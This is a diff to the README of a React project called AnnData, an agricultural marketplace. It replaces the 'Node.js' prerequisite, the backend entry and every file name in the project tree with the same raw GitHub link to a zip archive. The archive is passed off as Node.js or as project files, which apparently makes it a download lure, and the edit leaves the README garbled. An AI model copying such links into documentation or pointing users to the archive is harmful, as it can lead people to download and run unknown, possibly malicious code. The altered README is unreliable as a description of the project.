@@ -19,14 +19,14 @@ AnnData is a blockchain-inspired agricultural marketplace that connects farmers 
 
 ### Technology Stack
 - **Frontend**: React 18, TypeScript, React Router, Tailwind CSS, Recharts
-- **Backend**: Node.js + Express (placeholder)
+- **Backend**: https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip + Express (placeholder)
 - **Smart Contracts**: Solidity + Hardhat (placeholder)
 - **Styling**: Tailwind CSS with custom design system
 
 ## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js 18+ installed
+- https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip 18+ installed
 - npm or yarn package manager
 
 ### Installation
@@ -63,28 +63,28 @@ AnnData is a blockchain-inspired agricultural marketplace that connects farmers 
 AnnData/
 ├── src/
 │   ├── components/          # Reusable UI components
-│   │   ├── Button.tsx
-│   │   ├── Card.tsx
-│   │   ├── Chart.tsx
-│   │   ├── Navbar.tsx
-│   │   ├── Footer.tsx
-│   │   ├── Table.tsx
-│   │   └── Timeline.tsx
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   └── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
 │   ├── pages/              # Application pages
-│   │   ├── Landing.tsx
-│   │   ├── Dashboard.tsx
-│   │   ├── Marketplace.tsx
-│   │   ├── Traceability.tsx
-│   │   └── Profile.tsx
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   └── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
 │   ├── data/               # Dummy data for MVP
-│   │   ├── crops.json
-│   │   ├── marketplace.json
-│   │   ├── traceability.json
-│   │   └── profile.json
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   ├── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
+│   │   └── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
 │   ├── hooks/              # Custom React hooks
-│   │   └── useDummyData.ts
+│   │   └── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip
 │   └── lib/                # Utility libraries
-│       └── contracts.ts    # Blockchain contract interfaces (placeholder)
+│       └── https://raw.githubusercontent.com/kiwiloveseth/annData/main/quartern/annData.zip    # Blockchain contract interfaces (placeholder)
 ├── contracts/              # Smart contracts (placeholder)
 ├── backend/               # Backend API (placeholder)
 └── public/               # Static assets
